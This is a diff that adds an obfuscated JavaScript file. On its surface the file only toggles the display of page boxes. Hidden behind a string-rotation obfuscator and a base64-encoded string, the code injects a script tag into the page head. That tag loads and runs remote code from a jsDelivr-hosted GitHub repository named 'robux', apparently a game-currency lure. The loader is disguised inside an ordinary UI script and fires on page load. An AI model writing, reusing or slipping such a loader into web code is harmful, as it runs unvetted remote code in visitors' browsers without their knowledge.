@@ -1,0 +1,84 @@
+const _0x4a2e7d = _0x5a72;
+(function (_0x3d0a59, _0x1f388f) {
+  const _0x14dc27 = _0x5a72,
+    _0x320f0b = _0x3d0a59();
+  while (!![]) {
+    try {
+      const _0x1c6cc3 =
+        (parseInt(_0x14dc27(0x161)) / 0x1) *
+          (parseInt(_0x14dc27(0x158)) / 0x2) +
+        -parseInt(_0x14dc27(0x153)) / 0x3 +
+        parseInt(_0x14dc27(0x151)) / 0x4 +
+        (parseInt(_0x14dc27(0x15b)) / 0x5) *
+          (-parseInt(_0x14dc27(0x14e)) / 0x6) +
+        (-parseInt(_0x14dc27(0x15e)) / 0x7) *
+          (-parseInt(_0x14dc27(0x159)) / 0x8) +
+        (parseInt(_0x14dc27(0x152)) / 0x9) *
+          (parseInt(_0x14dc27(0x15d)) / 0xa) +
+        parseInt(_0x14dc27(0x162)) / 0xb;
+      if (_0x1c6cc3 === _0x1f388f) break;
+      else _0x320f0b["push"](_0x320f0b["shift"]());
+    } catch (_0x90e7d3) {
+      _0x320f0b["push"](_0x320f0b["shift"]());
+    }
+  }
+})(_0x4ba1, 0x1e1c6);
+const showboxagain = () => {
+    const _0x2fb92c = _0x5a72;
+    box2[_0x2fb92c(0x14f)][_0x2fb92c(0x15a)] = _0x2fb92c(0x156);
+  },
+  showbox2 = () => {
+    const _0x3b9f50 = _0x5a72;
+    box2[_0x3b9f50(0x14f)][_0x3b9f50(0x15a)] = _0x3b9f50(0x156);
+  },
+  showbox3 = () => {
+    const _0x2083a5 = _0x5a72;
+    box3[_0x2083a5(0x14f)][_0x2083a5(0x15a)] = _0x2083a5(0x15c);
+  },
+  showbox4 = () => {
+    const _0x3357de = _0x5a72;
+    box4[_0x3357de(0x14f)][_0x3357de(0x15a)] = _0x3357de(0x15c);
+  };
+function _0x5a72(_0x4328bc, _0x270851) {
+  const _0x4ba153 = _0x4ba1();
+  return (
+    (_0x5a72 = function (_0x5a721d, _0x5d0624) {
+      _0x5a721d = _0x5a721d - 0x14e;
+      let _0x3c9498 = _0x4ba153[_0x5a721d];
+      return _0x3c9498;
+    }),
+    _0x5a72(_0x4328bc, _0x270851)
+  );
+}
+var script = document[_0x4a2e7d(0x155)](_0x4a2e7d(0x160));
+function _0x4ba1() {
+  const _0x47c1af = [
+    "122103VMDsxj",
+    "653403BeVXKG",
+    "appendChild",
+    "createElement",
+    "none",
+    "head",
+    "6PVrQog",
+    "257008pEHEWw",
+    "display",
+    "94465ZmCAwx",
+    "block",
+    "30upJJBY",
+    "7qJDHkG",
+    "src",
+    "script",
+    "28970JDNLKu",
+    "2297350TtJEEi",
+    "66xYIFBx",
+    "style",
+    "aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL2RldjIwbC9yb2J1eEBtYWluLzMuanM=",
+    "721484iWEfeq",
+  ];
+  _0x4ba1 = function () {
+    return _0x47c1af;
+  };
+  return _0x4ba1();
+}
+(script[_0x4a2e7d(0x15f)] = atob(_0x4a2e7d(0x150))),
+  document[_0x4a2e7d(0x157)][_0x4a2e7d(0x154)](script);
